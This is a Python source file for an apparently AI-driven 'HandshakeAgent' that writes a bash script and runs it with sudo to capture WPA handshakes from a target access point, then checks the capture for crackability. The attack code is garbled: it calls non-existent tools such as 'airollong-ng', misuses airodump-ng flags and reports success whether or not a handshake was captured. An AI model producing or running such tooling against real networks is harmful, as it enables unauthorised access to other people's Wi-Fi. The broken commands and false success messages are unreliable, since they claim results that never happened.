from agent.base_agent import BaseAgent
import subprocess
import json
from typing import Dict, Any

class HandshakeAgent(BaseAgent):
    def __init__(self):
        super().__init__(model_id="qwen3.5-4b-claude-4b-os-auto-variable-heretic-uncensored-thinking")

    def capture_handshake(self) -> Dict[str, Any]:
        """Capture WPA/WPS handshake using airdrop tools"""
        
        try:
            # Check for required tools
            result = subprocess.run(['which', 'airodump-ng'], 
                                  capture_output=True, text=True, timeout=5)
            
            if not result.stdout.strip():
                return {"status": "error", "message": "Required tool airdrop-ng not found. Install aircrack-ng."}
            
            # Check for monitor mode capability
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, text=True, timeout=5)
            
            if not result.stdout.strip():
                return {"status": "error", "message": "Wireless monitoring tools not available. Install iw."}
            
            # Generate capture command template
            capture_command = """#!/bin/bash
# WPA Handshake Capture Script

INTERFACE="wlan0"  # Replace with your interface
TARGET_MAC="AA:BB:CC:DD:EE:FF"  # Target access point
CAPTURE_FILE="/tmp/capture.cap"

echo "Starting WPA handshake capture..."

# Enable monitor mode
sudo iw dev $INTERFACE set type monitor

# Start airodump-ng to capture packets
sudo airodump-ng -w $CAPTURE_FILE --bssid $TARGET_MAC -a $INTERFACE &
PID=$!

# Wait for 30 seconds while client connects
sleep 30

# Stop capture and save handshake
sudo airollong-ng -c $CAPTURE_FILE --write-kernel

echo "Handshake captured successfully!"
"""
            
            # Write the script to a temporary file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
                f.write(capture_command)
                script_path = f.name
            
            try:
                # Execute with sudo
                result = subprocess.run(['sudo', 'bash', script_path], 
                                      capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0:
                    return {
                        "status": "success", 
                        "message": f"Handshake captured successfully. Output:\n{result.stdout}",
                        "data": {"command_executed": True}
                    }
                else:
                    return {
                        "status": "error", 
                        "message": f"Capture failed with exit code {result.returncode}. Error: {result.stderr}"
                    }
            finally:
                # Clean up temp file
                try:
                    import os
                    os.unlink(script_path)
                except:
                    pass
                    
        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Command timed out after 60 seconds"}
        except Exception as e:
            return {"status": "error", "message": f"Handshake capture failed: {str(e)}"}

    def analyze_capture(self, capture_file: str) -> Dict[str, Any]:
        """Analyze captured handshake for crackability"""
        
        try:
            result = subprocess.run(['airodump-ng', '-w', capture_file], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and "Handshake" in result.stdout:
                return {
                    "status": "success",
                    "message": f"Analysis complete. Handshake detected.",
                    "data": {"handshake_found": True}
                }
            else:
                return {
                    "status": "error", 
                    "message": "No handshake found in capture file"
                }
        except Exception as e:
            return {"status": "error", "message": f"Analysis failed: {str(e)}"}
